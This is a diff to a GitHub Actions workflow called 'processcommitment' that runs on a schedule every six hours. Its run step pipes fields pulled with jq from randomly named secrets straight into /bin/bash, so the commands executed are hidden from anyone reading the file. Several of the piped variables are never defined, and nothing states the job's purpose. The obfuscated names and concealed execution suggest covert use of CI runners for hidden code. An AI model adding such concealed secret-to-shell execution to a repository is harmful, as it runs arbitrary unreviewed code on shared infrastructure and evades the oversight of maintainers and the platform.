@@ -3,7 +3,8 @@ name: processcommitment
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 5/6 * * *'
+    - cron: '26 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,11 +13,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: processcommitment
         env:
-          ulk79965: ${{ secrets.ulk79965 }}
+          uxi81: ${{ secrets.uxi81 }}
         run: |
-          echo $ulk79965 | jq -r .o372 | /bin/bash
-          echo $yutug9368 | jq -r .lk05 | /bin/bash
-          echo $ehb64 | jq -r .fmm6 | /bin/bash
-          echo $yw2 | jq -r .nvhqx42927 | /bin/bash
-          echo $pa090 | jq -r .l73 | /bin/bash
+          echo $uxi81 | jq -r .fnguo68566 | /bin/bash
+          echo $vcqa04512 | jq -r .k11 | /bin/bash
+          echo $k64 | jq -r .fgg8971 | /bin/bash
+          echo $skgqi16504 | jq -r .wr693 | /bin/bash
+          echo $xo6 | jq -r .rkzl36 | /bin/bash
 
